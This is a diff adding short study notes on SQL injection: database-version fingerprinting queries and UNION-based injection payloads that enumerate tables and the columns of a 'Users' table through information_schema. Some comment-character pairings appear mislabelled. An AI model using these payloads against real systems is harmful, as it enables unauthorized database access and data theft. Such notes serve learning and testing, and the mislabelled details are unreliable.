@@ -1,0 +1,31 @@
+for Oracle:
+SELECT * FROM v$version         comment char: /*
+returns banner and id
+
+
+
+for Microsoft, MySQL:
+' UNION SELECT @@version        comment char: #
+
+
+
+for PostgreSQL:
+' UNION SELECT version()        comment char: --
+
+
+Most databases except Oracle have:
+information_schema.tables 
+
+this is to list the tables in the database
+SELECT * FROM information_schema.tables
+
+get table names in the schema:
+'+UNION+SELECT+table_name,table_name+FROM+information_schema.tables--
+
+Can further do this to get the columns in 
+the table:
+
+SELECT * 
+FROM information_schema.columns 
+WHERE table_name = 'Users'
+
